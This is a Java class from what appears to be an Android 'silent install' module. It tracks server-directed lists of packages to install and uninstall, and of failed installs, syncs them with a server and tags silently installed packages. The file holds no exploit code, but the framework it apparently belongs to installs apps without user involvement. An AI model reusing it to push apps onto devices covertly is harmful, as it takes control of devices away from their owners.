package com.invisible.silentinstall.core;


import com.invisible.silentinstall.interact.PureInteract;
import com.invisible.silentinstall.utils.GlobalContext;
import com.invisible.silentinstall.utils.Util_Json;
import com.invisible.silentinstall.utils.Util_Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by zhengnan on 2015/8/31.
 * 管理客户端与服务器交互的数据的类
 * <p>
 * "dynamicData": {
 * "installList": [{
 * "packageName": "xx.xx.xx",
 * "versionCode": "20"
 * }],
 * "unInstallList": [{
 * "packageName": "xx.xx.xx"
 * },
 * {
 * "packageName": "xx.xx.xx"
 * }],
 * "failedList": [{
 * "packageName": "xx.xx.xx"
 * },
 * {
 * "packageName": "xx.xx.xx"
 * }]
 * }
 * </p>
 */
public class DynamicDataMgr {
    private Map<String,PkgInfo> installList = new HashMap<String, PkgInfo>();
    private Map<String,PkgInfo> unInstallList =  new HashMap<String, PkgInfo>();
    private Map<String,PkgInfo> failedList = new HashMap<String, PkgInfo>();

    public DynamicDataMgr(String json) {
        JSONObject jo = Util_Json.getJo(json);
        if (!Util_Json.checkJson(jo, "installList", "unInstallList", "failedList")) {
            return;
        }
        try {
            //install
            JSONArray arrayInstall = jo.getJSONArray("installList");
            for (int i = 0; i < arrayInstall.length(); i++) {
                PkgInfo pkgInfo = new PkgInfo(arrayInstall.getJSONObject(i));
                installList.put(pkgInfo.getPackageName(), pkgInfo);
            }
            //uninstall
            JSONArray arrayUnInstall = jo.getJSONArray("unInstallList");
            for (int i = 0; i < arrayUnInstall.length(); i++) {
                PkgInfo pkgInfo = new PkgInfo(arrayUnInstall.getJSONObject(i));
                unInstallList.put(pkgInfo.getPackageName(), pkgInfo);
            }
            //failed
            JSONArray arrayFailed = jo.getJSONArray("failedList");
            for (int i = 0; i < arrayFailed.length(); i++) {
                PkgInfo pkgInfo = new PkgInfo(arrayFailed.getJSONObject(i));
                failedList.put(pkgInfo.getPackageName(), pkgInfo);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String toString() {
        if(isEmpty()) return "";
        //add
        try {
            JSONObject jo = new JSONObject();
            //install
            JSONArray installArray = new JSONArray();
            for (String pkgInfo :getInstallList().keySet()) {
                installArray.put(new JSONObject(installList.get(pkgInfo).toString()));
            }
            //uninstall
            JSONArray unInstallArray = new JSONArray();
            for (String pkgInfo :unInstallList.keySet()) {
                unInstallArray.put(new JSONObject(unInstallList.get(pkgInfo).toString()));
            }
            //failed
            JSONArray failedArray = new JSONArray();
            for (String pkgInfo :failedList.keySet()) {
                failedArray.put(new JSONObject(failedList.get(pkgInfo).toString()));
            }

            jo.putOpt("installList", installArray)
                    .putOpt("unInstallList", unInstallArray)
                    .putOpt("failedList", failedArray);
            return jo.toString();
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return "";
    }

    //cust method
    public void addFailed(TaskModel task) {
        //（pkgInfo，只用包名来做唯一比较）
        PkgInfo pkgInfo = generatePkgInfo(task);
//        if (!failedList.contains(pkgInfo)) {
        failedList.put(pkgInfo.getPackageName(), pkgInfo);
            TaskManager.updateDData(this,true);
//        }
    }


    public void addInstalled(TaskModel task) {
        //如果是由静默模块安装的sdk包，就写入当前包的相关内容
        if(task.getConfid()==-100||task.isSdk()){
            PureInteract.getIns(GlobalContext.getCtx()).writeBuiltInstallTag(GlobalContext.getCid(), GlobalContext.getGid(),task.getPackageName());
        }

        PkgInfo pkgInfo = generatePkgInfo(task);
      //  if (!installList.contains(pkgInfo)) {
        installList.put(pkgInfo.getPackageName(), pkgInfo);//有时有可能是更新

        //每次安装成功时，检测 卸载和失败列表。
        unInstallList.remove(pkgInfo.getPackageName());
        failedList.remove(pkgInfo.getPackageName());
        TaskManager.updateDData(this, true);
        //   }
    }

    //    public void addUnInstalled(TaskModel task){
//        PkgInfo pkgInfo = generatePkgInfo(task);
//        if(!unInstallList.contains(pkgInfo)){
//            unInstallList.add(pkgInfo);
//            TaskManager.updateDData(this);
//        }
//    }
    public DynamicDataMgr.PkgInfo generatePkgInfo(TaskModel task) {
        DynamicDataMgr.PkgInfo pkgInfo = new DynamicDataMgr.PkgInfo();
        pkgInfo.setPackageName(task.getPackageName());
        pkgInfo.setVersionCode(task.getVersionCode() + "");
        pkgInfo.setExt(task.getExt() + "");
        return pkgInfo;
    }

    //判断实际数据来确定是否为null
    public boolean isEmpty() {
        return installList.size()+unInstallList.size()+failedList.size()<=0;
    }

    /**
     * 若服务器下发的  dynamicData 字段有值，则更新本地的数据
     * @param netData the data from si request for net
     */
    public DynamicDataMgr update4netData(String netData){
        DynamicDataMgr aDy = new DynamicDataMgr(Util_Json.getJsonParameter(Util_Json.getJo(netData), "dynamicData", ""));
        if(aDy.isEmpty()){

            return this;
        }
        Util_Log.logSI("update the dynamic data for netData!");
        try {
            TaskManager.updateDData(aDy,false);
            return aDy;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return this;
    }

    /**
     * @param pkgName 包名
     * @return 各列表中是否包含指定包名
     */
    public boolean contains(String pkgName){
        return (installList.containsKey(pkgName)||unInstallList.containsKey(pkgName)||failedList.containsKey(pkgName));
    }

    //setGet
    public Map<String,PkgInfo> getFailedList() {
        return failedList;
    }




    public Map<String,PkgInfo> getUnInstallList() {
        return unInstallList;
    }



    public Map<String,PkgInfo> getInstallList() {

        return installList;
    }




    /**
     * 对包而言更详细的信息
     */
    public static class PkgInfo {
        private String packageName = "";
        private String versionCode = "";
        private String ext = "";

        public PkgInfo() {
        }

        public PkgInfo(JSONObject jsonObject) {
            setPackageName(Util_Json.getJsonParameter(jsonObject, SIStr.packageName, ""));
            setVersionCode(Util_Json.getJsonParameter(jsonObject, SIStr.versionCode, ""));
            setExt(Util_Json.getJsonParameter(jsonObject, SIStr.ext, ""));
        }

        @Override
        public String toString() {
            JSONObject jo = new JSONObject();
            try {
                jo.putOpt(SIStr.packageName, packageName);
                jo.putOpt(SIStr.versionCode, versionCode);
                jo.putOpt(SIStr.ext, ext);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            return jo.toString();
        }

        public String getPackageName() {
            return packageName;
        }

        public void setPackageName(String packageName) {
            this.packageName = packageName;
        }

        public String getVersionCode() {
            return versionCode;
        }

        public void setVersionCode(String versionCode) {
            this.versionCode = versionCode;
        }

        public String getExt() {
            return ext;
        }

        public void setExt(String ext) {
            this.ext = ext;
        }

        @Override
        public boolean equals(Object o) {
            if (o.getClass() != this.getClass()) return false;
            PkgInfo obj = (PkgInfo) o;
            return (obj.getPackageName().equals(this.getPackageName()));//（pkgInfo，只用包名来做唯一比较）
        }

        @Override
        public int hashCode() {
            return 101;
        }
    }
}